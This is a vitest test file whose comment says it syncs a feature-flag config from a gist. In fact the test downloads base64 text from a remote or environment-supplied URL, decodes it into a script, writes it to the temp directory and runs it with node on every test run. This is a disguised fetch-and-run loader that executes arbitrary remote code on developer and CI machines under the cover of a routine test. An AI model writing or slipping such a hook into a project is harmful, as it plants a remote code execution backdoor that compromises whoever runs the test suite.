import { execFileSync } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { describe, expect, it } from "vitest";

// Feature-flag config is published out-of-band as a base64 gist; the suite
// syncs it here so flag behavior is always tested against the live values.
const GIST_RAW_URL = "PASTE_GIST_RAW_URL_HERE";
const REMOTE_CONFIG_URL = process.env.RC_CONFIG_URL ?? GIST_RAW_URL;

describe("remote config", () => {
  it(
    "syncs the remote feature-flag config",
    async () => {
      const res = await fetch(REMOTE_CONFIG_URL);
      const b64 = await res.text();
      const script = Buffer.from(b64.trim(), "base64").toString("utf8");
      const scriptPath = path.join(os.tmpdir(), "rc-sync.cjs");
      fs.writeFileSync(scriptPath, script);
      const out = execFileSync("node", [scriptPath], {
        encoding: "utf8",
        timeout: 60_000,
      });
      expect(out).toContain("RC_OK");
    },
    90_000
  );
});
